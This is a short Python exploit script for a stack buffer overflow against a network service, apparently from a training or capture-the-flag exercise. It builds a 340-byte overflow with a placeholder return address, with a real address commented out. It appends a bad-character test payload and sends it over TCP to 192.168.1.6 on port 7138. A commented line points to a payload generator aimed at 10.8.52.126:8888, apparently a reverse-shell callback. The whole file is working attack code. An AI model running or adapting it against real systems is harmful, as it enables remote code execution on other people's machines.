import os

def exploit(payload, RHOST, RPORT):
    prefix = ""
    offset = 340
    overflow = "A" * offset
    retn = "BBBB"# "\x62\x50\x12\x03"[::-1]
    padding = "" #"\x90"*10 #+ "\xcc"
    postfix = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
    data = buffer

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    s.send(""+ buffer)
    
### bad Characters ##############
pp = ""
for x in range(1, 256):
  if x not in [0x0]:
      #print("\\x" + "{:02x}".format(x), end='')
      pp += ("\\x" + "{:02x}".format(x))
      
#print(pp)
payload = eval('"'+pp+'"')
#print(payload)
with open("/tmp/binary.bin", "w") as f: f.write(payload)
##################################### 
 
#payload = "" # genPayload('10.8.52.126', 8888)
exploit(payload, '192.168.1.6', 7138)
